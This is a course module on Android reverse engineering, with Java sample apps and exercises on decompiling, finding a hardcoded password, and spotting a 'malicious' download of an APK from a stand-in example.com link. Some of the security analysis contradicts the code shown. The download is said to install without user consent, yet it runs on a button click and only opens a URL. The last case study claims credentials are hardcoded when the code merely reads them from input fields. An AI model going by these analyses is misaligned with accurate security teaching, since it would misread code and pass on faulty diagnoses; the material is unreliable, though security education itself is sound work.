**Module 9: Case Studies and Challenges (4 hours)**

In this module, we will be diving into real-world case studies and challenges in Android Reverse Engineering. We'll be analyzing different scenarios where RE can help us understand how an app works, identify potential vulnerabilities, and even uncover malicious behavior.

### 1. Analyzing a Simple Android App (30 minutes)

Let's start with a simple example of an Android app that needs to be reversed engineered. We'll take the following sample app:

```java
public class MainActivity extends AppCompatActivity {
    private EditText input;
    private TextView output;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        input = findViewById(R.id.input);
        output = findViewById(R.id.output);

        Button calculate = findViewById(R.id.calculate);
        calculate.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                String text = input.getText().toString();
                if (text.length() > 5) {
                    output.setText("Input is too long");
                } else {
                    output.setText(text.toUpperCase());
                }
            }
        });
    }
}
```

This app takes user input, checks its length, and then displays it in uppercase. We'll analyze this app to see how we can reverse engineer its functionality.

**Hands-on Exercise:**

1. Download the sample app (MainActivity.apk) from the course materials.
2. Use a tool like JD-GUI or Androlib to decompile the APK file into Java code.
3. Open the decompiled code in your favorite IDE (e.g., Android Studio, Eclipse).
4. Study the code and identify how it handles user input and calculates the output.

**Tips:**

* Pay attention to the `onClick` method, which is responsible for processing the user's input.
* Notice how the app checks the length of the input string using `text.length() > 5`.
* See how the app uses `output.setText()` to display the calculated result.

### 2. Identifying Vulnerabilities (45 minutes)

Now that we've analyzed a simple Android app, let's move on to identifying potential vulnerabilities in an Android app. We'll use a real-world example of an app that has been found to have a vulnerability.

**Sample App:**

Let's take the following sample app:

```java
public class MainActivity extends AppCompatActivity {
    private EditText password;
    private Button login;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        password = findViewById(R.id.password);
        login = findViewById(R.id.login);

        login.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                String pass = password.getText().toString();
                if (pass.equals("secret")) {
                    // Login successful
                } else {
                    // Login failed
                }
            }
        });
    }
}
```

This app takes a user's password and checks it against the hardcoded string "secret". If the password matches, it allows the user to log in.

**Vulnerability:**

Notice how the app is storing its secret password directly in Java code. This is a huge security vulnerability! Any attacker who can reverse engineer the APK file could easily extract this sensitive information.

**Hands-on Exercise:**

1. Use a tool like Androlib or APKTool to decompile the APK file into Java code.
2. Study the decompiled code and identify where the app stores its secret password.
3. Modify the code to store the secret password in a more secure location (e.g., using Android's keystore).

**Tips:**

* Always keep sensitive information, such as passwords or encryption keys, securely stored away from prying eyes.
* Use tools like Androlib or APKTool to decompile and analyze APK files, which can help you identify potential vulnerabilities.

### 3. Analyzing Malicious Behavior (45 minutes)

Now that we've identified a vulnerability in the previous example, let's move on to analyzing malicious behavior in an Android app. We'll use a real-world example of an app that has been found to have malware.

**Sample App:**

Let's take the following sample app:

```java
public class MainActivity extends AppCompatActivity {
    private Button download;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        download = findViewById(R.id.download);
        download.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                Uri uri = Uri.parse("https://example.com/malware.apk");
                Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                startActivity(intent);
            }
        });
    }
}
```

This app has a button that, when clicked, downloads and installs a malicious APK file from the internet.

**Malicious Behavior:**

Notice how the app is downloading and installing an APK file without any user interaction or consent. This is a huge red flag!

**Hands-on Exercise:**

1. Use a tool like Androlib or APKTool to decompile the APK file into Java code.
2. Study the decompiled code and identify where the app downloads and installs the malicious APK file.
3. Modify the code to prevent this behavior (e.g., by adding a prompt for user consent before downloading and installing the APK file).

**Tips:**

* Always be cautious when downloading and installing APK files from unknown sources.
* Use tools like Androlib or APKTool to decompile and analyze APK files, which can help you identify potential malicious behavior.

### 4. Case Study: Analyzing a Real-World App (1 hour)

In this final exercise, we'll analyze a real-world Android app that has been found to have security vulnerabilities. We'll use Androlib or APKTool to decompile the APK file and identify the potential vulnerabilities.

**Sample App:**

Let's take the following sample app:

```java
public class MainActivity extends AppCompatActivity {
    private EditText username;
    private EditText password;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        username = findViewById(R.id.username);
        password = findViewById(R.id.password);

        Button login = findViewById(R.id.login);
        login.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                String user = username.getText().toString();
                String pass = password.getText().toString();

                // Send request to server with username and password
                // ...
            }
        });
    }
}
```

This app takes a user's username and password, which are then sent to a server for authentication.

**Vulnerability:**

Notice how the app is storing its sensitive information (username and password) directly in Java code. This is a huge security vulnerability!

**Hands-on Exercise:**

1. Use Androlib or APKTool to decompile the APK file into Java code.
2. Study the decompiled code and identify where the app stores its sensitive information.
3. Modify the code to store this sensitive information more securely (e.g., using Android's keystore).

**Tips:**

* Always keep sensitive information, such as passwords or encryption keys, securely stored away from prying eyes.
* Use tools like Androlib or APKTool to decompile and analyze APK files, which can help you identify potential vulnerabilities.

By the end of this module, you should have a good understanding of how to reverse engineer Android apps, identify potential vulnerabilities, and even uncover malicious behavior. You'll be able to use these skills to analyze real-world Android apps and improve their security.
